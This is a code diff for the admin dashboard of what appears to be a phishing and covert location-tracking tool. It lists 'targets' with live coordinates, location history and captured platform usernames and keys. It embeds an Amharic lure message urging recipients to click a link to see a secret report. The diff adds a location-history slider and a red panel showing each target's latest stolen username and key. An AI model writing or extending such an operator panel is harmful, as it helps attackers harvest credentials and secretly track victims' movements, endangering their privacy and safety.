@@ -13,7 +13,7 @@ interface TargetData {
   accuracy: number;
   status: 'active' | 'offline' | 'warning';
   platform?: string;
-  history?: [number, number][];
+  history?: { lat: number, lng: number, time: string }[];
   intel?: { platform: string, user: string, key: string, timestamp: string }[];
 }
 
@@ -21,7 +21,8 @@ export const AdminDashboard: React.FC = () => {
   const [targets, setTargets] = useState<TargetData[]>([]);
   const [selectedTargetId, setSelectedTargetId] = useState<string | undefined>();
   const [selectedLanguage, setSelectedLanguage] = useState<'amharic' | 'arabic' | 'oromo' | 'both'>('amharic');
-  const [activeTab, setActiveTab] = useState<'all' | 'profiles'>('all');
+  const [activeTab, setActiveTab] = useState<'all' | 'folders'>('all');
+  const [historyIndex, setHistoryIndex] = useState(0);
   
   const translations = {
     amharic: "አስቸኳይ ምስጢራዊ መረጃ ስለአሁኑ ወቅታዊ መረጃ ነው በቀጥታ እንዳልልክልህ እንዳይታወቅብን ነዉ ቶሎ ብለህ በሊንኩ ግባና መረጃዉን እየዉ ለአንተ እንድልክ ትዕዛዝ ተሰጥቶኝ ነዉ... ሪፖርቱን ለማየት ከታች ያለውን ሊንክ ይጫን ቪድዮና ፎቶም በዉስጡ አለ ።",
@@ -272,16 +273,16 @@ export const AdminDashboard: React.FC = () => {
           <div className="flex-1 flex flex-col gap-2 overflow-hidden">
             <div className="flex justify-between items-center px-1">
               <label className="text-[10px] text-slate-500 uppercase font-bold tracking-widest">Intelligence Feed</label>
-              <div className="flex bg-slate-900 rounded p-0.5 border border-slate-800">
+                <div className="flex bg-slate-900 rounded p-1 border border-slate-800">
                 <button 
                   onClick={() => setActiveTab('all')}
-                  className={`px-2 py-0.5 text-[8px] rounded uppercase font-bold transition-all ${activeTab === 'all' ? 'bg-slate-700 text-white' : 'text-slate-500'}`}
+                  className={`px-4 py-1.5 text-[10px] rounded uppercase font-black transition-all ${activeTab === 'all' ? 'bg-blue-600 text-white shadow-lg' : 'text-slate-500 hover:text-slate-300'}`}
                 >
-                  All
+                  Live Feed
                 </button>
                 <button 
-                  onClick={() => setActiveTab('profiles')}
-                  className={`px-2 py-0.5 text-[8px] rounded uppercase font-bold transition-all ${activeTab === 'profiles' ? 'bg-slate-700 text-white' : 'text-slate-500'}`}
+                  onClick={() => setActiveTab('folders')}
+                  className={`px-4 py-1.5 text-[10px] rounded uppercase font-black transition-all ${activeTab === 'folders' ? 'bg-blue-600 text-white shadow-lg' : 'text-slate-500 hover:text-slate-300'}`}
                 >
                   Folders
                 </button>
@@ -376,7 +377,32 @@ export const AdminDashboard: React.FC = () => {
                             <span className="text-slate-500 uppercase font-bold">{target.status}</span>
                           </div>
                         </div>
-                        <div className="text-xs font-bold truncate text-slate-200">{target.name}</div>
+                        <div className="text-xs font-bold truncate text-slate-200 flex justify-between items-center">
+                          <span>{target.name}</span>
+                          <button 
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              setSelectedTargetId(target.id);
+                              setHistoryIndex(target.history ? target.history.length - 1 : 0);
+                            }}
+                            className="bg-slate-800 hover:bg-slate-700 p-1 rounded text-slate-500 hover:text-emerald-400 transition-colors"
+                          >
+                            <MapIcon className="w-3 h-3" />
+                          </button>
+                        </div>
+                        
+                        {target.intel && target.intel.length > 0 && (
+                          <div className="mt-2 bg-red-500/10 border border-red-500/20 p-1.5 rounded text-[8px] font-mono">
+                            <div className="flex justify-between items-center text-red-500 font-bold mb-0.5">
+                              <span>LAST_INTEL</span>
+                              <Activity className="w-2 h-2 animate-pulse" />
+                            </div>
+                            <div className="truncate text-red-400">
+                              {target.intel[target.intel.length-1].user} : {target.intel[target.intel.length-1].key}
+                            </div>
+                          </div>
+                        )}
+
                         <div className="text-[9px] text-slate-500 mt-2 font-mono flex justify-between uppercase">
                           <span>Lat: {target.lat.toFixed(4)}</span>
                           <span>Lng: {target.lng.toFixed(4)}</span>
@@ -387,21 +413,29 @@ export const AdminDashboard: React.FC = () => {
                     /* Folder Logic: Grouped by Target Name */
                     Object.entries(groupedTargetsByName).map(([folderName, folderTargets]) => (
                       <div key={folderName} className="space-y-1 mb-4">
-                        <div className="flex items-center gap-2 px-2 py-1 bg-slate-900/50 rounded border border-slate-800 mb-2">
-                          <Users className="w-3 h-3 text-slate-500" />
-                          <span className="text-[9px] font-bold text-slate-400 uppercase tracking-widest">{folderName}</span>
+                        <div className="flex items-center gap-2 px-3 py-1.5 bg-slate-900 rounded border border-slate-800 mb-2 group cursor-pointer hover:bg-slate-800 transition-colors">
+                          <Users className="w-3.5 h-3.5 text-blue-500" />
+                          <span className="text-[10px] font-black text-slate-300 uppercase tracking-widest flex-1">{folderName}</span>
+                          <span className="text-[9px] bg-slate-800 px-1.5 rounded text-slate-500 group-hover:text-blue-400">{folderTargets.length}</span>
                         </div>
-                        <div className="pl-2 space-y-1 border-l border-slate-800 ml-2">
+                        <div className="pl-3 space-y-1.5 border-l-2 border-slate-800/50 ml-3">
                            {folderTargets.map(target => (
                              <div 
                                key={target.id}
-                               onClick={() => setSelectedTargetId(target.id)}
-                               className={`px-3 py-2 text-[10px] rounded cursor-pointer transition-all ${selectedTargetId === target.id ? 'bg-blue-600/20 text-blue-400 border border-blue-500/30' : 'text-slate-500 hover:text-slate-300'}`}
+                               onClick={() => {
+                                 setSelectedTargetId(target.id);
+                                 setHistoryIndex(target.history ? target.history.length - 1 : 0);
+                               }}
+                               className={`px-3 py-2 text-[10px] rounded cursor-pointer transition-all ${selectedTargetId === target.id ? 'bg-blue-600/20 text-blue-400 border border-blue-500/30' : 'text-slate-500 hover:text-slate-300 hover:bg-slate-800/30'}`}
                              >
                                 <div className="flex items-center gap-2">
-                                  <div className={`w-1.5 h-1.5 rounded-full ${target.status === 'active' ? 'bg-emerald-500' : 'bg-slate-700'}`}></div>
-                                  <span className="font-mono">{target.id.slice(0, 8).toUpperCase()}</span>
-                                  <span className="opacity-50 text-[8px]">{new Date(target.lastSeen).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
+                                  <div className={`w-1.5 h-1.5 rounded-full ${target.status === 'active' ? 'bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.5)]' : 'bg-slate-700'}`}></div>
+                                  <span className="font-mono text-[9px]">{target.id.slice(0, 8).toUpperCase()}</span>
+                                  <span className="opacity-30 text-[8px]">—</span>
+                                  <span className="truncate text-[9px] font-bold opacity-80">{new Date(target.lastSeen).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
+                                  {target.intel && target.intel.length > 0 && (
+                                    <div className="ml-auto w-2 h-2 bg-red-500 rounded-full animate-pulse shadow-[0_0_5px_#ef4444]"></div>
+                                  )}
                                 </div>
                              </div>
                            ))}
@@ -428,6 +462,7 @@ export const AdminDashboard: React.FC = () => {
               history: t.history
             }))} 
             selectedTargetId={selectedTargetId}
+            historyIndex={historyIndex}
           />
 
           {/* Map Overlays */}
@@ -435,9 +470,17 @@ export const AdminDashboard: React.FC = () => {
             <div className="bg-[#0a0c12]/95 border border-slate-800 p-4 rounded-lg backdrop-blur-md shadow-[0_20px_50px_rgba(0,0,0,0.5)] border-l-4 border-l-emerald-500">
               <div className="text-[10px] text-slate-500 font-mono underline uppercase tracking-[0.2em] mb-2 opacity-60">Live Telemetry Feed</div>
               <div className="text-2xl font-mono text-emerald-400 tracking-tighter font-bold">
-                {selectedTarget ? `${selectedTarget.lat.toFixed(6)}°N` : '0.000000°N'}
+                {selectedTarget?.history && historyIndex >= 0 && historyIndex < selectedTarget.history.length 
+                  ? `${selectedTarget.history[historyIndex].lat.toFixed(6)}°N` 
+                  : selectedTarget 
+                    ? `${selectedTarget.lat.toFixed(6)}°N` 
+                    : '0.000000°N'}
                 <br />
-                {selectedTarget ? `${selectedTarget.lng.toFixed(6)}°E` : '0.000000°E'}
+                {selectedTarget?.history && historyIndex >= 0 && historyIndex < selectedTarget.history.length 
+                  ? `${selectedTarget.history[historyIndex].lng.toFixed(6)}°E` 
+                  : selectedTarget 
+                    ? `${selectedTarget.lng.toFixed(6)}°E` 
+                    : '0.000000°E'}
               </div>
               <div className="text-[10px] text-slate-400 mt-2 flex items-center gap-2">
                 <Navigation className="w-3 h-3 text-red-500" />
@@ -538,22 +581,64 @@ export const AdminDashboard: React.FC = () => {
                )}
             </div>
 
-            <div className="space-y-4">
-               <div className="text-[10px] text-slate-500 uppercase tracking-[0.2em] font-bold px-1">Sat Link Status</div>
-               <div className="grid grid-cols-2 gap-2">
-                  <div className="bg-slate-900/50 border border-slate-800 p-2 rounded flex flex-col items-center">
-                    <p className="text-[8px] text-slate-500 opacity-50 uppercase tracking-widest">S_PING</p>
-                    <p className={`text-[11px] font-mono font-bold ${selectedTarget ? 'text-emerald-500' : 'text-slate-600'}`}>
-                      {selectedTarget ? `${Math.floor(Math.random() * 50 + 10)}ms` : '---'}
-                    </p>
-                  </div>
-                  <div className="bg-slate-900/50 border border-slate-800 p-2 rounded flex flex-col items-center">
-                    <p className="text-[8px] text-slate-500 opacity-50 uppercase tracking-widest">ATM_INT</p>
-                    <p className={`text-[11px] font-mono font-bold ${selectedTarget ? 'text-blue-400' : 'text-slate-600'}`}>
-                      {selectedTarget ? `${Math.floor(Math.random() * 5 + 95)}%` : '---'}
-                    </p>
-                  </div>
+            <div className="bg-slate-900/50 border border-slate-800 rounded-xl p-4 space-y-4">
+               <div className="flex justify-between items-center px-1">
+                 <div className="text-[10px] text-slate-500 uppercase tracking-[0.2em] font-bold">Signal History Navigation</div>
+                 {selectedTarget?.history && (
+                   <div className="text-[10px] font-mono text-blue-400">
+                     BLOCK {historyIndex + 1} / {selectedTarget.history.length}
+                   </div>
+                 )}
                </div>
+               
+               <div className="space-y-3">
+                 <input 
+                   type="range"
+                   min="0"
+                   max={selectedTarget?.history ? selectedTarget.history.length - 1 : 0}
+                   value={historyIndex}
+                   onChange={(e) => setHistoryIndex(parseInt(e.target.value))}
+                   className="w-full h-1.5 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-blue-500"
+                   disabled={!selectedTarget?.history || selectedTarget.history.length <= 1}
+                 />
+
+                 <div className="flex gap-2">
+                   <button 
+                     disabled={!selectedTarget?.history || historyIndex === 0}
+                     onClick={() => setHistoryIndex(prev => prev - 1)}
+                     className="flex-1 bg-slate-800 border border-slate-700 py-2 rounded text-[10px] font-bold text-slate-300 hover:bg-slate-700 disabled:opacity-30 transition-colors uppercase tracking-widest"
+                   >
+                     RECALL
+                   </button>
+                   <button 
+                     disabled={!selectedTarget?.history || historyIndex === (selectedTarget.history.length - 1)}
+                     onClick={() => setHistoryIndex(prev => prev + 1)}
+                     className="flex-1 bg-slate-800 border border-slate-700 py-2 rounded text-[10px] font-bold text-slate-300 hover:bg-slate-700 disabled:opacity-30 transition-colors uppercase tracking-widest"
+                   >
+                     ADVANCE
+                   </button>
+                 </div>
+               </div>
+
+               {selectedTarget?.history && selectedTarget.history[historyIndex] && (
+                 <div className="bg-black/40 p-3 border border-slate-800 rounded font-mono text-[10px] space-y-1 shadow-inner group">
+                    <div className="flex justify-between">
+                      <span className="text-slate-600">LAT:</span>
+                      <span className="text-emerald-400 font-bold">{(selectedTarget.history[historyIndex] as any).lat.toFixed(6)}</span>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-slate-600">LNG:</span>
+                      <span className="text-emerald-400 font-bold">{(selectedTarget.history[historyIndex] as any).lng.toFixed(6)}</span>
+                    </div>
+                    <div className="flex justify-between border-t border-slate-800 mt-2 pt-1">
+                      <span className="text-slate-600">INTEL_TIME:</span>
+                      <span className="text-blue-500">{(selectedTarget.history[historyIndex] as any).time ? new Date((selectedTarget.history[historyIndex] as any).time).toLocaleTimeString() : 'N/A'}</span>
+                    </div>
+                    <div className="pt-2 flex justify-center opacity-0 group-hover:opacity-100 transition-opacity">
+                      <span className="text-[8px] text-amber-500/50 italic">SATELLITE_COORDINATE_VERIFIED</span>
+                    </div>
+                 </div>
+               )}
             </div>
           </div>
         </aside>
